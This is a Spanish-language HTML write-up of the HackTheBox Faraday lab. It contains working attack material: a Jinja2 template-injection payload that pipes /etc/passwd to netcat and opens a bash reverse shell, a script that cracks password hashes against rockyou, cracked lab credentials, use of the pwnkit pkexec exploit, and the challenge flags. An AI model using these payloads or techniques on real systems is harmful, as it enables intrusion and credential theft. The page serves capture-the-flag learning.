@@ -1,0 +1,408 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Faraday HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/faraday.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Faraday HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de el fortress Faraday de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de el fortress Faraday de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Faraday HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Faraday HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de el fortress Faraday de la plataforma de HackTheBox","headline":"Writeup Faraday HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Faraday HackTheBox</h1>
+          <p>Resolución de el fortress Faraday de la plataforma de HackTheBox</p>
+        </div>
+
+<div><strong><h3>Flag 1</h3></strong></div>
+<div><strong><h3>FARADAY{ehlo_@nd_w3lcom3!}</h3></strong></div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.13.37.14
+Nmap scan report for 10.13.37.14
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8888/tcp open  sun-answerbook</span>
+</code></pre></div></div>
+
+<div><p>Al entrar a la web podemos ver un panel de autenticación</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>También podemos crear una cuenta asi que lo hacemos</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Creamos la cuenta y nos logueamos con los datos</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Nos pide configurar un servidor smtp, podemos apuntar a nuestro equipo por el puerto 25</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Podemos ver que nos pregunta un nombre, interesantemente podemos elegir varios</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Al darle send pero interceptar con burpsuite podemos ver que podemos modificar el nombre en la petición mediante ?name=</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Por ahora no nos sirve de nada, al dar a send podemos enviar un mensaje</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Ya que configuramos el smtp a nuestro servidor, lo crearemos en local para interceptar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3 </span><span class="p">-m smtpd -c DebuggingServer -n 10.13.14.10:25 
+</span>
+</code></pre></div></div>
+
+<div><p>Al dar a report y enviar el mensaje nos llegan varias cosas entre ellas la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3 </span><span class="p">-m smtpd -c DebuggingServer -n 10.13.14.10:25
+---------- MESSAGE FOLLOWS ----------
+b'Subject: test'
+b'X-Peer: 10.13.37.14'
+b''
+b'An event was reported at JohnConnor:'
+b'testing'
+b'Here is your gift </span><span class="kd">FARADAY{ehlo_@nd_w3lcom3!}</span><span class="p">'
+------------ END MESSAGE ------------</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 2</h3></strong></div>
+<div><strong><h3>FARADAY{7x7_1s_n0t_@lw4ys_49}</h3></strong></div>
+
+<div><p>En lo que interceptamos podemos ver que se refleja el nombre del usuario escogido</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">---------- MESSAGE FOLLOWS ----------
+b'Subject: test'
+b'X-Peer: 10.13.37.14'
+b''
+b'An event was reported at </span><span class="kd">JohnConnor</span><span class="p">:'
+b'testing'
+b'Here is your gift FARADAY{ehlo_@nd_w3lcom3!}'
+------------ END MESSAGE ------------</span>
+</code></pre></div></div>
+
+<div><p>Podemos forzar el nombre de usuario a un payload de SSTI para ver si se interpreta entrando a <a href="http://10.13.37.14/profile?name={{7*7}}">http://10.13.37.14/profile?name={{7*7}}</a> esto nos redigirá a crear el mensaje</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Enviamos el mensaje y podemos ver que hay algun tipo de sanitización que quita el {{</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3 </span><span class="p">-m smtpd -c DebuggingServer -n 10.13.14.10:25
+---------- MESSAGE FOLLOWS ----------
+b'Subject: test'
+b'X-Peer: 10.13.37.14'
+b''
+b'An event was reported at 7*7}}'
+b'testing'
+b'Here is your gift </span><span class="kd">FARADAY{ehlo_@nd_w3lcom3!}</span><span class="p">'
+------------ END MESSAGE ------------</span>
+</code></pre></div></div>
+
+<div><p>En este <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">articulo</a> nos explica, tomaremos el payload que ejecuta un comando para modificarlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc HOSTNAME 1337')['read']() == 'chiv' %} a {% endif %}</span>
+</code></pre></div></div>
+
+<div><p>Cambiaremos el comando para enviarnos una reverse shell en lugar de leer el passwd</span><span class="p">
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">cat /etc/passwd | nc HOSTNAME 1337</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">bash -c "bash -i >& /dev/tcp/10.13.14.10/443 0>&1</span>
+</code></pre></div></div>
+
+<div><p>Nuestro payload ahora para la reverse shell seria el siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash -c "bash -i >& /dev/tcp/10.13.14.10/443 0>&1"')['read']() == 'chiv' %} a {% endif %}</span>
+</code></pre></div></div>
+
+<div><p>Ya que lo haremos mediante una peticion get tenemos que urlencodearlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">{%25+if+request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/10.13.14.10/443+0>%261"')['read']()+%3d%3d+'chiv'+%25}+a+{%25+endif+%25}</span>
+</code></pre></div></div>
+
+<div><p>Ahora nuestra petición seria contra http://10.13.37.14/profile?name= y el payload urlencodeado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">http://10.13.37.14/profile?name={%25+if+request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/10.13.14.10/443+0>%261"')['read']()+%3d%3d+'chiv'+%25}+a+{%25+endif+%25}</span>
+</code></pre></div></div>
+
+<div><p>Nos redirigirá a la creación del mensaje, volvemos a enviarlo</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Al enviarlo, nos llegará la reverse shell que hemos definido en el payload, podemos leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.37.14
+</span><span class="s2">root@98aa0f47eb96</span><span class="p">:</span><span class="na">/app</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@98aa0f47eb96</span><span class="p">:</span><span class="na">/app</span><span class="p"># hostname -I
+172.22.0.3 
+</span><span class="s2">root@98aa0f47eb96</span><span class="p">:</span><span class="na">/app</span><span class="p"># cat flag.txt
+</span><span class="kd">FARADAY{7x7_1s_n0t_@lw4ys_49}
+</span><span class="s2">root@98aa0f47eb96</span><span class="p">:</span><span class="na">/app</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 3</h3></strong></div>
+<div><strong><h3>FARADAY{C_1s-0ld-Bu7_n0t-0bs0|3te}</h3></strong></div>
+
+<div><p>En el directorio db podemos encontrar el archivo database.db</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@98aa0f47eb96</span><span class="p">:</span><span class="na">/app/db</span><span class="p"># ls
+database.db
+</span><span class="s2">root@98aa0f47eb96</span><span class="p">:</span><span class="na">/app/db</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>La pasamos a nuestro equipo, la abrimos con sqlite3 y leemos las tablas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlite3 </span><span class="p">database.db 
+Enter ".help" for usage hints.
+</span><span class="kd">sqlite></span><span class="p"> .tables
+message_model  smtp_config    user_model   
+</span><span class="kd">sqlite></span>
+</code></pre></div></div>
+
+<div><p>Leemos lo que hay en la tabla y encontramos usuarios y hashes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">sqlite></span><span class="p"> select * from user_model;
+1|admin@faradaysec.com|administrator|sha256$GqgROghu45Dw4D8Z$5a7eee71208e1e3a9e3cc271ad0fd31fec133375587dc6ac1d29d26494c3a20f
+2|octo@faradaysec.com|octo|sha256$gqsmQ2210dEMufAk$98423cb07f845f263405de55edb3fa9eb09ada73219380600fc98c54cd700258
+3|pasta@faradaysec.com|pasta|sha256$MsbGKnO1PaFa3jhV$6b166f7f0066a96e7565a81b8e27b979ca3702fdb1a80cef0a1382046ed5e023
+4|root@faradaysec.com|root|sha256$L2eaiLgdT73AvPij$dc98c1e290b1ec3b9b8f417a553f2abd42b94694e2a62037e4f98d622c182337
+5|pepe@gmail.com|pepe|sha256$9NzZrF4OtO9r0nFx$c3aa1b68bea55b4493d2ae96ec596176890c4ccb6dedf744be6f6bdbd652255d
+6|nobody@gmail.com|nobody|sha256$E2bUlSPGhOi2f5Mi$2982efbc094ed13f7169477df7c078b429f60fe2155541665f6f41ef42cd91a1
+7|gato@gato.gato|gato|sha256$bqj2oXtUlHDlHFou$59f536af7721af13dfc01394fc4f01f57d09fe15f93b50c860b7f1d7e1af7f7a
+</span><span class="kd">sqlite></span>
+</code></pre></div></div>
+
+<div><p>Le podemos dar un poco de forma con la sintaxis user:hash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hashes
+administrator:sha256$GqgROghu45Dw4D8Z$5a7eee71208e1e3a9e3cc271ad0fd31fec133375587dc6ac1d29d26494c3a20f
+octo:sha256$gqsmQ2210dEMufAk$98423cb07f845f263405de55edb3fa9eb09ada73219380600fc98c54cd700258
+pasta:sha256$MsbGKnO1PaFa3jhV$6b166f7f0066a96e7565a81b8e27b979ca3702fdb1a80cef0a1382046ed5e023
+root:sha256$L2eaiLgdT73AvPij$dc98c1e290b1ec3b9b8f417a553f2abd42b94694e2a62037e4f98d622c182337
+pepe:sha256$9NzZrF4OtO9r0nFx$c3aa1b68bea55b4493d2ae96ec596176890c4ccb6dedf744be6f6bdbd652255d
+nobody:sha256$E2bUlSPGhOi2f5Mi$2982efbc094ed13f7169477df7c078b429f60fe2155541665f6f41ef42cd91a1
+gato:sha256$bqj2oXtUlHDlHFou$59f536af7721af13dfc01394fc4f01f57d09fe15f93b50c860b7f1d7e1af7f7a</span>
+</code></pre></div></div>
+
+<div><p>Al usar john o hashcat no logramos romper los hashes, por lo que creamos un script que lo haga</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">from</span><span class="p"> werkzeug.security </span><span class="kd">import </span><span class="p">check_password_hash
+
+hashes </span><span class="kd">=</span><span class="k"> open</span><span class="p">(</span><span class="s2">'hashes'</span><span class="p">,</span><span class="s2"> 'r'</span><span class="p">)
+</span><span class="kd">for</span><span class="p"> hashl </span><span class="kd">in</span><span class="p"> hashes:
+    hash </span><span class="kd">=</span><span class="p"> hashl.split(</span><span class="s2">":"</span><span class="p">)[</span><span class="na">1</span><span class="p">].strip()
+    user </span><span class="kd">=</span><span class="p"> hashl.split(</span><span class="s2">":"</span><span class="p">)[</span><span class="kd">-</span><span class="na">2</span><span class="p">].strip()</span><span class="p">
+
+    </span><span class="kd">with</span><span class="k"> open</span><span class="p">(</span><span class="s2">'/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt'</span><span class="p">,</span><span class="s2"> 'r'</span><span class="p">, </span><span class="no">errors</span><span class="kd">=</span><span class="s2">'ignore'</span><span class="p">) </span><span class="kd">as</span><span class="p"> file:
+        </span><span class="kd">for </span><span class="p">line </span><span class="kd">in</span><span class="p"> file:
+            password </span><span class="kd">=</span><span class="p"> line.strip()
+            </span><span class="kd">if</span><span class="p"> check_password_hash(hash, password):
+                </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"[\033[1;32m+\033[1;37m] Credencial valida: {user}:{password}"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div><p>Lo ejecutamos y encontramos 4 credenciales validas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="s2">+</span><span class="p">] Credencial valida: administrator:ihatepasta
+[</span><span class="s2">+</span><span class="p">] Credencial valida: octo:octopass
+[</span><span class="s2">+</span><span class="p">] Credencial valida: pasta:antihacker
+[</span><span class="s2">+</span><span class="p">] Credencial valida: pepe:sarmiento</span>
+</code></pre></div></div>
+
+<div><p>Al conectarnos al puerto 8888 nos pide credenciales prodemos probar alguna de ellas, las credenciales de pasta son validas y nos da una flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat</span><span class="p"> 10.13.37.14 8888
+Welcome to FaradaySEC stats!!!
+Username: </span><span class="kd">pasta</span><span class="p">
+Password: </span><span class="kd">antihacker</span><span class="p">
+access granted!!!
+</span><span class="kd">FARADAY{C_1s-0ld-Bu7_n0t-0bs0|3te}</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 4</h3></strong></div>
+<div><strong><h3>FARADAY{d0ubl3_@nd_f1o@t_be@uty}</h3></strong></div>
+<div><p>En proceso.... espere pronto</p></div>
+
+<div><strong><h3>Flag 5</h3></strong></div>
+<div><strong><h3>FARADAY{@cc3ss_10gz_c4n_b3_use3fu111}</h3></strong></div>
+
+<div><p>Probando la contraseña de administrator por ssh conseguimos una shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">administrator@10.13.37.14
+administrator@10.13.37.14's password: </span><span class="kd">ihatepasta</span><span class="p">
+</span><span class="s2">administrator@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(administrator) gid=1000(administrator) groups=1000(administrator)
+</span><span class="s2">administrator@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.13.37.14 172.22.0.1 172.17.0.1 dead:beef::250:56ff:feb9:ae45 
+</span><span class="s2">administrator@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+ 
+<div><p>Buscando archivos del usuario podemos ver el archivo access.log de apache2</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">administrator@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -user administrator 2>/dev/null | grep -vE "/proc|/sys|/home|/run"
+/dev/pts/0
+/var/mail/administrator
+/var/log/apache2/access.log
+</span><span class="s2">administrator@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Hay algunas peticiones a update.php que parecen de sqlmap como la siguiente urldecodeada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">3738 192.168.86.1 - - [20/Jul/2021:08:07:48 -0700] "GET /update.php?keyword=python' WHERE 3207=3207 AND (SELECT 6800 FROM (SELECT(SLEEP(3-(IF(ORD(MID((SELECT IFNULL(CAST(message AS NCHAR),0x20) FROM challenge.`search` ORDER BY id LIMIT 9,1),32,1))!=116,0,3)))))Xuth)-- MEBO&text=linux HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"</span>
+</code></pre></div></div>
+
+<div><p>Empezamos creando un script, primero urldecodeamos todas las lineas del access.log</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">with </span><span class="k">open</span><span class="p">(</span><span class="s2">"/var/log/apache2/access.log"</span><span class="p">)</span><span class="kd"> as</span><span class="p"> file:
+    </span><span class="kd">for</span><span class="p"> line </span><span class="kd">in</span><span class="p"> file:
+        line </span><span class="kd">=</span><span class="p"> urllib.parse.unquote(line)</span>
+</code></pre></div></div>
+
+<div><p>Ahora haremos que solo tome las lineas que tienen update.php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">if not</span><span class="s2"> "update.php" </span><span class="kd">in</span><span class="p"> line:
+</span><span class="kd">    continue</span>
+</code></pre></div></div>
+
+<div><p>Lo que buscamos en ello es el numero que esta despues de ))!=</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">regex </span><span class="kd">=</span><span class="p"> re.search(</span><span class="s2">"\)\)!=(\d+)"</span><span class="p">, line)
+</span><span class="kd">if</span><span class="p"> regex:
+    decimal </span><span class="kd">=</span><span class="k"> int</span><span class="p">(regex.group(</span><span class="na">1</span><span class="p">))</span>
+</code></pre></div></div>
+
+<div><p>Finalmente pasamos el valor decimal a ascii</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">print</span><span class="p">(</span><span class="k">chr</span><span class="p">(decimal), </span><span class="no">end</span><span class="kd">=</span><span class="s2">""</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div><p>El script quedaria algo como el siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">import </span><span class="p">re, urllib.parse
+
+</span><span class="kd">with </span><span class="k">open</span><span class="p">(</span><span class="s2">"/var/log/apache2/access.log"</span><span class="p">) </span><span class="kd">as</span><span class="p"> file:
+    </span><span class="kd">for</span><span class="p"> line </span><span class="kd">in</span><span class="p"> file:
+        line </span><span class="kd">=</span><span class="p"> urllib.parse.unquote(line)
+        </span><span class="kd">if not</span><span class="s2"> "update.php"</span><span class="kd"> in</span><span class="p"> line:
+            </span><span class="kd">continue</span><span class="p">
+        regex </span><span class="kd">=</span><span class="p"> re.search(</span><span class="s2">"\)\)!=(\d+)"</span><span class="p">, line)
+        </span><span class="kd">if</span><span class="p"> regex:
+            decimal </span><span class="kd">=</span><span class="k"> int</span><span class="p">(regex.group(</span><span class="na">1</span><span class="p">))
+            </span><span class="k">print</span><span class="p">(</span><span class="k">chr</span><span class="p">(decimal), </span><span class="no">end</span><span class="kd">=</span><span class="s2">""</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo en una parte podemos encontrar la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">administrator@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p">$ python3 exploit.py
+....</span><span class="kd">FARADAY{@cc3ss_10gz_c4n_b3_use3fu111}</span><span class="p">....
+</span><span class="s2">administrator@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 6</h3></strong></div>
+<div><strong><h3>FARADAY{__1s_pR1nTf_Tur1ng_c0mPl3t3?__}</h3></strong></div>
+
+<div><p>El pkexec es suid, nos aprovechamos del <a href="https://github.com/berdav/CVE-2021-4034">pwnkit</a> y conseguimos shell como root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">administrator@erlenmeyer</span><span class="p">:</span><span class="na">~/pkexec</span><span class="p">$ ls -l /usr/bin/pkexec
+-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
+<span class="s2">administrator@erlenmeyer</span><span class="p">:</span><span class="na">~/pkexec</span><span class="p">$ ./cve-2021-4034 
+</span><span class="s2">root@erlenmeyer</span><span class="p">:</span><span class="na">/home/administrator/pkexec</span><span class="p"># cd /root
+</span><span class="s2">root@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.13.37.14 172.22.0.1 172.17.0.1 dead:beef::250:56ff:feb9:ae45 
+</span><span class="s2">root@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p"># cat flag.txt 
+</span><span class="kd">FARADAY{__1s_pR1nTf_Tur1ng_c0mPl3t3?__}
+</span><span class="s2">root@erlenmeyer</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 7</h3></strong></div>
+<div><strong><h3>FARADAY{__LKM-is-a-l0t-l1k3-an-0r@ng3__}</h3></strong></div>
+
+<div><p>Hay un rookit implementado, en este caso Reptile que te permite ocultar archivos y directorios, usaremos la particion /dev/sda3 para copiarla en nuesro equipo, en mi caso como faradaysda3 y crear una montura en /mnt</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo losetup </span><span class="p">/dev/loop10 faradaysda3
+</span><span class="s2">❯ sudo kpartx </span><span class="p">-a /dev/loop10
+</span><span class="s2">❯ sudo vgdisplay </span><span class="p">-v |</span><span class="s2"> grep</span><span class="no"> "LV Path"</span><span class="p">
+  LV Path                /dev/ubuntu-vg/ubuntu-lv
+  LV Path                /dev/ubuntu-vg/swap
+</span><span class="s2">❯ mount </span><span class="p">/dev/ubuntu-vg/ubuntu-lv /mnt/
+</span><span class="s2">❯ ls</span><span class="p"> -l /mnt
+lrwxrwxrwx  1 root root     7 Feb  1  2021 </span><span class="na">bin</span><span class="p"> -> </span><span class="na">usr/bin</span><span class="p">
+drwxr-xr-x  2 root root  4096 Jul 16  2021 </span><span class="na">boot</span><span class="p">
+drwxr-xr-x  2 root root  4096 Jul 16  2021 </span><span class="na">cdrom</span><span class="p">
+drwxr-xr-x  5 root root  4096 Feb  1  2021 </span><span class="na">dev</span><span class="p">
+drwxr-xr-x 97 root root  4096 Dec  2 21:46 </span><span class="na">etc</span><span class="p">
+drwxr-xr-x  5 root root  4096 Jul 20  2021 </span><span class="na">home</span><span class="p">
+lrwxrwxrwx  1 root root     7 Feb  1  2021 </span><span class="na">lib</span><span class="p"> -> </span><span class="na">usr/lib</span><span class="p">
+lrwxrwxrwx  1 root root     9 Feb  1  2021 </span><span class="na">lib32</span><span class="p"> -> </span><span class="na">usr/lib32</span><span class="p">
+lrwxrwxrwx  1 root root     9 Feb  1  2021 </span><span class="na">lib64</span><span class="p"> -> </span><span class="na">usr/lib64</span><span class="p">
+lrwxrwxrwx  1 root root    10 Feb  1  2021 </span><span class="na">libx32</span><span class="p"> -> </span><span class="na">usr/libx32</span><span class="p">
+drwx------  2 root root 16384 Jul 16  2021 </span><span class="na">lost+found</span><span class="p">
+drwxr-xr-x  2 root root  4096 Feb  1  2021 </span><span class="na">media</span><span class="p">
+drwxr-xr-x  2 root root  4096 Dec  3 00:15 </span><span class="na">mnt</span><span class="p">
+drwxr-xr-x  2 root root  4096 Feb  1  2021 </span><span class="na">opt</span><span class="p">
+drwxr-xr-x  2 root root  4096 Apr 15  2020 </span><span class="na">proc</span><span class="p">
+drwxrwxr-x  2 root root  4096 Nov 10 03:05 </span><span class="na">reptile</span><span class="p">
+drwxr-xr-x  2 root root  4096 Nov 17 12:09 </span><span class="kd">reptileRoberto</span><span class="p">
+drwx------  8 root root  4096 Dec  2 21:47 </span><span class="na">root</span><span class="p">
+drwxr-xr-x 11 root root  4096 Feb  1  2021 </span><span class="na">run</span><span class="p">
+lrwxrwxrwx  1 root root     8 Feb  1  2021 </span><span class="na">sbin</span><span class="p"> -> </span><span class="na">usr/sbin</span><span class="p">
+drwxr-xr-x  7 root root  4096 Jul 16  2021 </span><span class="na">snap</span><span class="p">
+drwxr-xr-x  2 root root  4096 Feb  1  2021 </span><span class="na">srv</span><span class="p">
+drwxr-xr-x  2 root root  4096 Apr 15  2020 </span><span class="na">sys</span><span class="p">
+drwxrwxrwt 14 root root  4096 Dec  3 00:41 </span><span class="na">tmp</span><span class="p">
+drwxr-xr-x 14 root root  4096 Feb  1  2021 </span><span class="na">usr</span><span class="p">
+drwxr-xr-x 13 root root  4096 Feb  1  2021 </span><span class="na">var</span>
+</code></pre></div></div>
+
+<div><p>Podemos simplemente entrar y en los archivos leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cd</span><span class="p"> /mnt/reptileRoberto
+</span><span class="s2">❯ ls </span><span class="p">-l
+-rwxr-xr-x 1 root root 42760 Jul 20  2021 </span><span class="s2">reptileRoberto</span><span class="p">
+-rwxrwxrwx 1 root root 14472 Jul 20  2021 </span><span class="s2">reptileRoberto_cmd</span><span class="p">
+-rw-r--r-- 1 root root    41 Jul 20  2021 reptileRoberto_flag.txt
+-rwxrwxrwx 1 root root 67816 Jul 20  2021 </span><span class="s2">reptileRoberto_shell</span><span class="p">
+-rwxrwxrwx 1 root root   667 Jul 20  2021 </span><span class="s2">reptileRoberto_start</span><span class="p">
+</span><span class="s2">❯ cat </span><span class="p">reptileRoberto_flag.txt
+</span><span class="kd">FARADAY{__LKM-is-a-l0t-l1k3-an-0r@ng3__}</span>
+</code></pre></div></div>
+
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
